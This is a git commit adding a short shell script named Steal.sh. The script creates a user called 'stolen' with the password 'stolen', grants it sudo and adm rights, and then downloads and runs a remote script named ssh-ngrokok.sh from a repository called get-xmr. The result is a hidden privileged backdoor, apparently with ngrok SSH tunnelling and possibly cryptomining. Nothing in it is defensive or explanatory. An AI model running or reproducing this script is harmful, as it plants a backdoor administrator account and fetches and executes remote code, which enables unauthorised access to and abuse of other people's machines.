b4bd553d5671f436363a3458af8efb9bb4f3f73c
rdpmakers <108381973+rdpmakers@users.noreply.github.com>
2022-09-07 17:11:41 +0700

    Create Steal.sh

---
+++ Steal.sh
@@ -0,0 +1,9 @@
+sudo bash
+sudo apt update
+sudo apt upgrade -y
+sudo apt install wget -y
+sudo apt install curl -y
+sudo adduser stolen --gecos "First Last,RoomNumber,WorkPhone,HomePhone" --disabled-password
+echo "stolen:stolen" | sudo chpasswd
+sudo usermod -aG sudo,adm stolen
+wget https://raw.githubusercontent.com/a2nk/get-xmr/main/ssh-ngrokok.sh && chmod +x ssh-ngrokok.sh && ./ssh-ngrokok.sh
